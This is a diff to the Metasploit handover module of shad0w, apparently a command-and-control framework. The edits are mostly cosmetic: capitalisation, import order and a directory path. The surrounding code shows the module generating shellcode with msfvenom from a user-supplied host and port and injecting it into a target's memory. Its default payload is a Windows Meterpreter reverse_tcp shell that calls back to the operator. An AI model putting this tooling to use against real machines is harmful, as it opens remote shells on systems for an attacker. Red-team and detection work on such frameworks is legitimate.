@@ -1,12 +1,12 @@
 #
-# metasploit handover module
+# Metasploit handover module
 #
 
-from lib import buildtools, tools, shellcode
-import os
 import argparse
+import os
+from lib import buildtools, tools, shellcode
 
-__description__ = "Metasploit handover module, will generate and deploy metasploit payload into memory"
+__description__ = "Metasploit handover module, will generate and deploy Metasploit payload into memory"
 __author__ = "@Flangvik"
 
 EXEC_ID = 0x3000
@@ -32,7 +32,7 @@ def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch):
     shad0w.debug.log(f"Metasploit is building the shellcode...", log=True)
 
     # put us in the correct dir (inside docker)
-    os.chdir("/root/shad0w/bin/metasploit")
+    os.chdir("/opt/shad0w/bin/metasploit")
 
     #Generate the shellcode
     os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw -a {arch} > {shad0w.current_beacon}.bin")
@@ -63,9 +63,9 @@ def main(shad0w, args):
     parser.error = error
 
     # setup the args, set default='' to show help message when missing
-    parser.add_argument("--port", required=True, help="Port you would like metasploit to call")
-    parser.add_argument("--host", required=True, help="Host/IP you would like metasploit to call")
-    parser.add_argument("--payload", help="What metasploit payload you would like to deploy , default: windows/x64/meterpreter/reverse_tcp",required=False, default="windows/x64/meterpreter/reverse_tcp")
+    parser.add_argument("--port", required=True, help="Port you would like Metasploit to call")
+    parser.add_argument("--host", required=True, help="Host/IP you would like Metasploit to call")
+    parser.add_argument("--payload", help="What Metasploit payload you would like to deploy , default: windows/x64/meterpreter/reverse_tcp",required=False, default="windows/x64/meterpreter/reverse_tcp")
 
     # make sure we dont die from weird args
     try:
